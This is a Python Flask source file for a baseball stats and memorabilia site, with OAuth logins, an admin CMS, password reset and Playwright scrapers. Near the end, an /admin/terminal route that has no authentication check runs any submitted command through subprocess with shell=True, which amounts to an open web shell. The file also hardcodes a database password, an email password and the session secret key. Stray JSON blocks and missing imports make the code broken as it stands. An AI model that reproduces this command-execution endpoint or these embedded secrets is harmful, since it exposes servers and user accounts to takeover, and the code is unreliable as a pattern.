import os
import time
import asyncio
import datetime
import pytz
from flask import Flask, Response, jsonify, render_template, render_template_string, request, redirect, url_for, session
from werkzeug.security import check_password_hash, generate_password_hash
from datetime import date
from datetime import datetime
from playwright.async_api import async_playwright
from pymongo import MongoClient
from itsdangerous import URLSafeTimedSerializer
from flask_mail import Mail, Message
from flask_dance.contrib.google import make_google_blueprint, google
from flask_dance.contrib.facebook import make_facebook_blueprint, facebook
from functools import wraps
from flask_talisman import Talisman  # Enforces HTTPS security headers
from werkzeug.middleware.proxy_fix import ProxyFix
import subprocess

# Initialize Flask app
app = Flask(__name__, template_folder="pages", static_url_path="/static")
Talisman(app)  # ✅ Forces HTTPS on all routes
Talisman(app, content_security_policy={
    'default-src': ["'self'"],
    'script-src': ["'self'", "https://code.jquery.com", "https://cdn.datatables.net", "'unsafe-inline'"],
    'style-src': ["'self'", "https://cdn.datatables.net", "'unsafe-inline'"],
    'img-src': ["'self'", "data:", "https:"],
    'font-src': ["'self'", "https://cdn.datatables.net"]
})

app.secret_key = "The5Weapon!33534"  # Replace this with a strong, unique string in production
serializer = URLSafeTimedSerializer(app.secret_key)
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
port = int(os.environ.get("PORT", 8080))

# Google
google_bp = make_google_blueprint(
    client_id=os.environ.get("GOOGLE_CLIENT_ID"),
    client_secret=os.environ.get("GOOGLE_CLIENT_SECRET"),
    scope=["https://www.googleapis.com/auth/userinfo.profile", "https://www.googleapis.com/auth/userinfo.email", "openid"],
    redirect_to="google_login",
    redirect_url="https://firststring.biz/login/google/authorized"  # ✅ Forces HTTPS redirect URI
)
app.register_blueprint(google_bp, url_prefix="/login")

# Facebook
facebook_bp = make_facebook_blueprint(
    client_id=os.environ.get("FACEBOOK_CLIENT_ID"),
    client_secret=os.environ.get("FACEBOOK_CLIENT_SECRET"),
    redirect_to="facebook_login"
)
app.register_blueprint(facebook_bp, url_prefix="/login")

# Connect to MongoDB using Railway-provided URI
MONGO_URI = os.getenv("MONGO_URI", "mongodb://mongo:MXQDxgcJWYBgTFtLPiwGdsnRXTIONzNc@trolley.proxy.rlwy.net:25766")
client = MongoClient(MONGO_URI)
db = client["mlb_stats"]
collection = db["batter_vs_pitcher"]
streak_collection = db["hot_streak_players"]
db = client["first_string_users"]
users_collection = db["users"]
listings_collection = db["listings"]
page_views = db["page_views"]
search_logs = db["search_logs"]



{
  "slug": "/shop/product/nike-x-lebron",
  "hits": 104,
  "last_viewed": "2025-06-12T20:44:00Z"
}

{
  "query": "jordan jersey 1996",
  "timestamp": "...",
  "ip": "...",
  "device": "Mozilla/5.0..."
}


app.config.update(
    MAIL_SERVER="smtp.gmail.com",
    MAIL_PORT=587,
    MAIL_USE_TLS=True,
    MAIL_USERNAME="firststring.biz@gmail.com",
    MAIL_PASSWORD="MiamiCanes$1",
    MAIL_DEFAULT_SENDER="First String <noreply@firststring.com>"
)

mail = Mail(app)

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get("role") != "admin":
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function


def track_view(slug):
    page_views.update_one(
        {"slug": slug},
        {"$inc": {"hits": 1}, "$set": {"last_viewed": datetime.utcnow()}},
        upsert=True
    )

@app.route("/admin/dashboard")
@admin_required
def admin_dashboard():
    return render_template("admin_dashboard.html")

@app.route("/login/google")
def google_login():
    session["oauth_state"] = google_bp.session.state  # ✅ Save state in session
    return redirect(url_for("google.login", _external=True, _scheme="https"))


def get_google_oauth_token():
    return session.get("google_token")

@app.route("/login/google/authorized")
def google_callback():
    # Debugging: Verify redirect flow
    print(f"[DEBUG] Google Redirected Here: {request.url}")

    auth_code = request.args.get("code")
    if not auth_code:
        print("[ERROR] No authorization code received.")
        return "OAuth failed: No authorization code", 401

    response = google.authorized_response()
    
    if response is None or "access_token" not in response:
        print("[ERROR] Access token missing.")
        return "OAuth failed: No access token", 401

    session["google_token"] = response["access_token"]

    try:
        user_info = google.get("userinfo").json()
        print(f"[DEBUG] Google User Info: {user_info}")
    except Exception as e:
        print(f"[ERROR] Failed to fetch user info: {e}")
        return "Failed to fetch user data", 500

    return redirect(url_for("user_dashboard", _external=True, _scheme="https"))

@app.route("/facebook_login")
def facebook_login():
    if not facebook.authorized:
        return redirect(url_for("facebook.login"))

    info = facebook.get("/me?fields=name,email").json()
    email = info["email"]
    name = info["name"]

    user = users_collection.find_one({"email": email})
    if not user:
        users_collection.insert_one({
            "username": name,
            "email": email,
            "role": "user",
            "plan": "free",
            "oauth_provider": "facebook"
        })

    session["logged_in"] = True
    session["username"] = name
    session["role"] = "user"
    return redirect(url_for("user_dashboard"))

@app.route("/facebook/delete", methods=["GET", "POST"])
def facebook_delete():
    return render_template("delete-my-data.html")

@app.route("/cms/create_user", methods=["POST"])
def create_user():
    if session.get("role") != "admin":
        return redirect(url_for("login"))

    username = request.form["username"]
    password = request.form["password"]
    role = request.form["role"]
    plan = request.form["plan"]

    if users_collection.find_one({"username": username}):
        return "Username already exists", 400

    users_collection.insert_one({
        "username": username,
        "password_hash": generate_password_hash(password),
        "role": role,
        "plan": plan
    })

    return redirect(url_for("admin_manage_users"))

@app.route("/webhook/etsy", methods=["POST"])
def etsy_webhook():
    data = request.json  # Get webhook data
    listing_id = data.get("listing_id")

    if listing_id:
        save_listing_to_db(listing_id, custom_keywords=[])  # Auto-import listing
        return jsonify({"status": "success"})

    return jsonify({"status": "error", "message": "Invalid data"}), 400

@app.route("/admin/listings")
@admin_required
def admin_listings():
    listings = listings_collection.find()
    return render_template("listings.html", listings=listings)

@app.route("/admin/manage-users")
@admin_required
def admin_manage_users():
    users = users_collection.find()
    return render_template("manage_users.html", users=users)

@app.route("/admin/search-analytics")
@admin_required
def search_analytics():
    top_queries = search_logs.aggregate([
        {"$group": {"_id": "$query", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 50}
    ])
    return render_template("search_analytics.html", queries=top_queries)

@app.route("/admin/page-traffic")
@admin_required
def page_traffic():
    sort_field = request.args.get("sort", "hits")
    pages = page_views.find().sort(sort_field, -1)
    return render_template("traffic_report.html", pages=pages)

@app.route("/admin/listings/new", methods=["GET", "POST"])
@admin_required
def new_listing():
    if request.method == "POST":
        title = request.form["title"]
        category = request.form["category"]
        price = float(request.form["price"])
        description = request.form["description"]

        listings_collection.insert_one({
            "title": title,
            "category": category,
            "price": price,
            "description": description,
            "created_at": datetime.utcnow()
        })

        return redirect(url_for("admin_listings"))

    return render_template("listings_form.html", listing=None)

@app.route("/admin/listings/<id>/edit", methods=["GET", "POST"])
@admin_required
def edit_listing(id):
    listing = listings_collection.find_one({"_id": ObjectId(id)})

    if request.method == "POST":
        listings_collection.update_one({"_id": ObjectId(id)}, {
            "$set": {
                "title": request.form["title"],
                "category": request.form["category"],
                "price": float(request.form["price"]),
                "description": request.form["description"]
            }
        })
        return redirect(url_for("admin_listings"))

    return render_template("listings_form.html", listing=listing)

@app.route("/forgot-password", methods=["GET", "POST"])
def forgot_password():
    if request.method == "POST":
        email = request.form["email"]
        user = users_collection.find_one({"email": email})
        if not user:
            return "Email not found", 404

        token = serializer.dumps(email, salt="password-reset")
        reset_url = url_for("reset_password", token=token, _external=True)

        # Load HTML email template (inline or from file)
        html_body = render_template("emails/password_reset.html", reset_url=reset_url, year=datetime.now().year)

        msg = Message("Reset Your First String Password", recipients=[email], html=html_body)
        mail.send(msg)

        return "A reset link has been sent to your email."

    return render_template("forgot_password.html")


@app.route("/reset-password/<token>", methods=["GET", "POST"])
def reset_password(token):
    try:
        email = serializer.loads(token, salt="password-reset", max_age=3600)
    except Exception:
        return "Reset link is invalid or has expired", 403

    if request.method == "POST":
        new_pw = request.form["password"]
        hashed = generate_password_hash(new_pw)
        users_collection.update_one({"email": email}, {"$set": {"password_hash": hashed}})
        return redirect(url_for("login"))

    return render_template("reset_password.html", token=token)

@app.route("/cms/update_user", methods=["POST"])
def update_user():
    if session.get("role") != "admin":
        return redirect(url_for("login"))

    username = request.form["username"]
    plan = request.form["plan"]

    users_collection.update_one({"username": username}, {"$set": {"plan": plan}})
    return redirect(url_for("admin_manage_users"))

@app.route("/cms/delete_user", methods=["POST"])
def delete_user():
    if session.get("role") != "admin":
        return redirect(url_for("login"))

    username = request.form["username"]
    users_collection.delete_one({"username": username})
    return redirect(url_for("admin_manage_users"))

@app.route("/cms/update_role", methods=["POST"])
def update_role():
    if session.get("role") != "admin":
        return redirect(url_for("login"))

    username = request.form["username"]
    role = request.form["role"]

    users_collection.update_one({"username": username}, {"$set": {"role": role}})
    return redirect(url_for("admin_manage_users"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        identity = request.form["username"]
        password = request.form["password"]

        user = users_collection.find_one({
            "$or": [{"username": identity}, {"email": identity}]
        })

        if user and check_password_hash(user["password_hash"], password):
            session["logged_in"] = True
            session["username"] = user["username"]
            session["role"] = user.get("role", "user")
            return redirect(url_for("cms_dashboard") if user.get("role") == "admin" else url_for("user_dashboard"))

        return "Invalid credentials", 401

    return render_template("login.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        name = request.form["name"]
        username = request.form["username"]
        email = request.form["email"]
        password = request.form["password"]
        plan = request.form.get("plan", "free")

        if users_collection.find_one({"$or": [{"username": username}, {"email": email}]}):
            return "Username or email already exists", 400

        users_collection.insert_one({
            "name": name,
            "username": username,
            "email": email,
            "password_hash": generate_password_hash(password),
            "role": "user",
            "plan": plan
        })

        session["logged_in"] = True
        session["username"] = username
        session["role"] = "user"

        return redirect(url_for("user_dashboard"))

    return render_template("register.html")

@app.route("/cms")
def cms_dashboard():
    if session.get("role") != "admin":
        return redirect(url_for("login"))
    return render_template("cms.html")

@app.route("/dashboard")
def user_dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    user = users_collection.find_one({"username": session["username"]}, {"_id": 0, "password_hash": 0})
    if not user:
        return "User not found", 404

    return render_template("user_dashboard.html", user=user)

async def scrape_all_data(date):
    # Run both scrapers concurrently
    async with asyncio.TaskGroup() as tg:
        streak_task = tg.create_task(scrape_streak_data())
        stats_task = tg.create_task(scrape_data(date))
        
        streak_data, stats_data = await asyncio.gather(streak_task, stats_task)

    return streak_data, stats_data

async def scrape_data(date):
    url = f"https://swishanalytics.com/optimus/mlb/batter-vs-pitcher-stats?date={date}"
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        await page.goto(url, timeout=15000, wait_until="domcontentloaded")
        print(f"[DEBUG] Scraping data for {date} from {url}")

        try:
            await page.wait_for_selector("table tbody tr", timeout=10000)
        except Exception:
            print("[ERROR] Table not found or took too long to load!")
            return []

        rows_data = await page.eval_on_selector_all("table tbody tr", r"""
            rows => {
                const teamAbbreviations = {
                    "whitesox": "CWS", "guardians": "CLE", "tigers": "DET", "royals": "KC", "twins": "MIN",
                    "orioles": "BAL", "redsox": "BOS", "yankees": "NYY", "rays": "TB", "bluejays": "TOR",
                    "athletics": "OAK", "astros": "HOU", "angels": "LAA", "mariners": "SEA", "rangers": "TEX",
                    "cubs": "CHC", "reds": "CIN", "brewers": "MIL", "pirates": "PIT", "cardinals": "STL",
                    "braves": "ATL", "marlins": "MIA", "mets": "NYM", "phillies": "PHI", "nationals": "WAS",
                    "diamondbacks": "ARI", "rockies": "COL", "dodgers": "LAD", "padres": "SD", "giants": "SF"
                };

                return rows.map(row => {
                    let cells = row.querySelectorAll("td");
                    let teamImgs = row.querySelectorAll("td img");
                    if (cells.length < 14 || teamImgs.length < 2) return null;

                    let batterTeam = teamImgs[0]?.src?.split('/').pop().replace('.png', '').toLowerCase();
                    let pitcherTeam = teamImgs[1]?.src?.split('/').pop().replace('.png', '').toLowerCase();
                    let batterElement = cells[0]?.querySelector(".batter-name");
                    let pitcherElement = cells[1]?.querySelector(".pitcher-name");
                    let batterName = batterElement?.innerText?.trim() || "Unknown";
                    let pitcherName = pitcherElement?.innerText?.trim() || "Unknown";
                    let batterHandedness = batterElement?.nextSibling?.textContent?.trim() || "";
                    let batterPosition = batterElement?.nextSibling?.nextSibling?.textContent?.trim() || "";
                    let pitcherHandedness = pitcherElement?.nextSibling?.textContent?.trim() || "";

                    const removeNA = (text) => text.replace(/\$?N\/A/g, "").trim();
                    const fixParentheses = (text) => text.replace(/[()]+/g, "").trim();

                    batterHandedness = removeNA(batterHandedness) ? `(${fixParentheses(removeNA(batterHandedness))})` : "";
                    batterPosition = removeNA(batterPosition);
                    pitcherHandedness = removeNA(pitcherHandedness) ? `(${fixParentheses(removeNA(pitcherHandedness))})` : "";

                    return {
                        team_batter: teamAbbreviations[batterTeam] || "Unknown",
                        batter: batterName,
                        batter_info: `${batterHandedness} ${batterPosition}`.trim(),
                        team_pitcher: teamAbbreviations[pitcherTeam] || "Unknown",
                        pitcher: pitcherName,
                        pitcher_hand: pitcherHandedness,
                        stats: {
                            PA: cells[2]?.innerText?.trim(),
                            AB: cells[3]?.innerText?.trim(),
                            H: cells[4]?.innerText?.trim(),
                            '1B': cells[5]?.innerText?.trim(),
                            '2B': cells[6]?.innerText?.trim(),
                            '3B': cells[7]?.innerText?.trim(),
                            HR: cells[8]?.innerText?.trim(),
                            BB: cells[9]?.innerText?.trim(),
                            SO: cells[10]?.innerText?.trim(),
                            AVG: cells[11]?.innerText?.trim(),
                            OBP: cells[12]?.innerText?.trim(),
                            SLG: cells[13]?.innerText?.trim()
                        }
                    };
                }).filter(row => row !== null);
            }
        """)
        await browser.close()
        return rows_data

def get_streak_data():
    """Retrieve cached streak data from MongoDB for today's scrape date."""
    today_str = date.today().strftime("%Y-%m-%d")
    entry = streak_collection.find_one({"scrape_date": today_str}, {"_id": 0})  # Explicitly exclude _id
    return entry if entry else None



# Set to 1 for forced re-scraping (debug), 0 for normal behavior.
ALWAYS_SCRAPE = 1

async def scrape_streak_data():
    """Scrape streak data only if no cached entry exists for today's scrape date."""
    today_str = date.today().strftime("%Y-%m-%d")
    
    # Remove any cached data not from today.
    streak_collection.delete_many({"scrape_date": {"$ne": today_str}})
    
    if not ALWAYS_SCRAPE:
        cached_data = streak_collection.find_one({"scrape_date": today_str}, {"_id": 0})
        if cached_data:
            print(f"[DEBUG] Using cached streak data for {today_str}")
            return cached_data

    url = "https://www.baseballmusings.com/cgi-bin/CurStreak.py"
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        await page.goto(url, timeout=15000, wait_until="domcontentloaded")
        
        date_element = await page.query_selector("h2")
        streak_date_scraped = await date_element.inner_text() if date_element else "Unknown"
        
        rows_data = await page.eval_on_selector_all("table tbody tr", r"""
rows => {
    const data = [];
    for (let row of rows) {
        let cells = row.querySelectorAll("td");
        const count = cells.length;
        if (count === 1) {
            let raw = cells[0].innerText.trim();
            if (raw.indexOf("\t") >= 0) {
                let parts = raw.split("\t").map(s => s.trim());
                if (parts.length >= 13) {
                    if (parts[0].toLowerCase().includes("player")) continue;
                    data.push({
                        player: parts[0],
                        games: parts[1],
                        atBats: parts[2],
                        runs: parts[3],
                        hits: parts[4],
                        hr: parts[5],
                        rbi: parts[6],
                        bb: parts[7],
                        k: parts[8],
                        ba: parts[9],
                        oba: parts[10],
                        slug: parts[11],
                        lastGameDate: parts[12]
                    });
                }
            }
        } else if (count === 13) {
            if (cells[0].innerText.toLowerCase().includes("player")) continue;
            data.push({
                player: cells[0].innerText.trim(),
                games: cells[1].innerText.trim(),
                atBats: cells[2].innerText.trim(),
                runs: cells[3].innerText.trim(),
                hits: cells[4].innerText.trim(),
                hr: cells[5].innerText.trim(),
                rbi: cells[6].innerText.trim(),
                bb: cells[7].innerText.trim(),
                k: cells[8].innerText.trim(),
                ba: cells[9].innerText.trim(),
                oba: cells[10].innerText.trim(),
                slug: cells[11].innerText.trim(),
                lastGameDate: cells[12].innerText.trim()
            });
        } else {
            continue;
        }
    }
    return data;
}
""")
        await browser.close()

        new_data = {
            "date": streak_date_scraped,
            "scrape_date": today_str,
            "players": rows_data
        }
        streak_collection.delete_many({"scrape_date": today_str})
        streak_collection.insert_one(new_data)
        print(f"[DEBUG] Cached new streak data for {today_str}")
        print(f"[DEBUG] Streak data extracted: {rows_data}")
        print(f"[DEBUG] Players on hot streak: {[player['player'] for player in rows_data if 'player' in player]}")
        return new_data


def store_data(date, data):
    """Deletes old data for the date if outdated, then stores fresh scraped data."""
    current_time = datetime.utcnow()

    # Add timestamp field to all entries
    cleaned_data = [{k: v for k, v in entry.items() if k != "_id"} for entry in data]
    for entry in cleaned_data:
        entry["date"] = date
        entry["last_updated"] = current_time

    collection.delete_many({"date": date})  # Clear outdated data
    collection.insert_many(cleaned_data)
    print(f"[DEBUG] Stored updated data for {date} at {current_time}")

def get_data(date):
    return list(collection.find({"date": date}, {"_id": 0}))

def get_current_est_date():
    """
    Return the current date in Eastern Time as a string in format YYYY-MM-DD.
    (No after-8PM adjustment is applied here.)
    """
    user_timezone = pytz.timezone("America/New_York")
    now_local = datetime.now(user_timezone)
    return now_local.date().strftime("%Y-%m-%d")

# ------------------------------
# ROUTE DEFINITIONS
# ------------------------------

@app.route("/")
def home():
    """
    Render the home page.
    If a query parameter 'date' is provided, use that;
    otherwise, use the current EST date.
    """
    query_date = request.args.get("date")
    date = query_date if query_date else get_current_est_date()
    print(f"[DEBUG] FINAL Date Used for Display: {date}")
    # Pass the date to the template so the client-side nav links can be built from it.
    return render_template("MyBatterVsPitcher.html", date=date)

@app.route("/MyBatterVsPitcher.html")
def serve_bvp_page():
    return send_from_directory("templates", "MyBatterVsPitcher.html")

#@app.route("/static/<path:filename>")
#def static_files(filename):
#    return send_from_directory("static", filename)

@app.route("/stats/daily-bvp")
def daily_bvp():
    return render_template("MyBatterVsPitcher.html")  # Ensure this file exists in templates

@app.route("/stats")
def stats():
    query_date = request.args.get("date") or get_current_est_date()
    print(f"[DEBUG] Fetching stats for {query_date}")

    # Check if data exists and when it was last updated
    existing_entry = collection.find_one({"date": query_date}, {"_id": 0})
    
    if existing_entry:
        last_updated = existing_entry.get("last_updated")
        if last_updated:
            time_elapsed = datetime.utcnow() - last_updated

            # If data is less than 2 hours old, return cached data
            if time_elapsed.total_seconds() < 7200:
                print(f"[DEBUG] Using cached data for {query_date}, last updated {last_updated}")
                return jsonify(list(collection.find({"date": query_date}, {"_id": 0})))

    # Otherwise, scrape fresh data
    print(f"[DEBUG] Data for {query_date} is outdated, refreshing now.")
    scraped_data = asyncio.run(scrape_data(query_date))

    if scraped_data:
        store_data(query_date, scraped_data)
        return jsonify(scraped_data)

    return jsonify({"error": "No data found for this date"}), 404


from bson import ObjectId

def convert_object_ids(obj):
    if isinstance(obj, dict):
        return {k: convert_object_ids(v) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [convert_object_ids(i) for i in obj]
    elif isinstance(obj, ObjectId):
        return str(obj)  # Convert ObjectId to string
    else:
        return obj

@app.route("/streak-data")
def streak_data():
    data = get_streak_data()
    if data is None:
        # If no cache is available for today, force a scrape.
        data = asyncio.run(scrape_streak_data())
    
    cleaned_data = convert_object_ids(data)  # Convert ObjectIds before returning
    return jsonify(cleaned_data)

#@app.route("/streak-data")
#def streak_data():
#    data = get_streak_data()
#    if data is None:
        # If no cache is available for today, force a scrape.
#        data = asyncio.run(scrape_streak_data())
#    return jsonify(data)


@app.route("/change-date")
def change_date():
    """
    Handle a date selection request.
    If data for the chosen date is not cached, scrape it.
    Then redirect to the home page with the chosen date.
    """
    query_date = request.args.get("date")
    date = query_date if query_date else get_current_est_date()
    print(f"[DEBUG] FINAL Date Before Redirect: {date}")
    cached_data = get_data(date)
    if not cached_data:
        scraped_data = asyncio.run(scrape_data(date))
        if scraped_data:
            store_data(date, scraped_data)
    return redirect(url_for("home", date=date))

@app.route("/index.html")
def index_redirect():
    return redirect(url_for("home"))

@app.before_request
def debug_request_info():
    print(f"Request URL: {request.url}")
    print(f"Request Scheme: {request.scheme}")
    print(f"Headers: {dict(request.headers)}")

    if request.endpoint and request.endpoint != "static":  # ✅ Prevents error for static files
        print(f"Redirect URI: {url_for(request.endpoint, _external=True)}")

def enforce_https():
    if request.headers.get("X-Forwarded-Proto") != "https":
        return redirect(request.url.replace("http://", "https://"), code=301)

def redirect_www():
    if request.host.startswith("www."):
        return redirect(request.url.replace("www.", ""), code=301)

@app.after_request
def add_security_headers(response):
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' https://code.jquery.com https://cdn.datatables.net 'unsafe-inline'; "
        "style-src 'self' https://cdn.datatables.net 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self' https://cdn.datatables.net;"
    )
    return response

@app.route("/admin/terminal", methods=["GET", "POST"])
def admin_terminal():
    output = ""
    if request.method == "POST":
        command = request.form.get("command")
        if command:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
            except subprocess.CalledProcessError as e:
                output = e.output.decode()
    return render_template("terminal.html", output=output)

@app.route("/shop")
def shop():
    return render_template("shop.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=port)
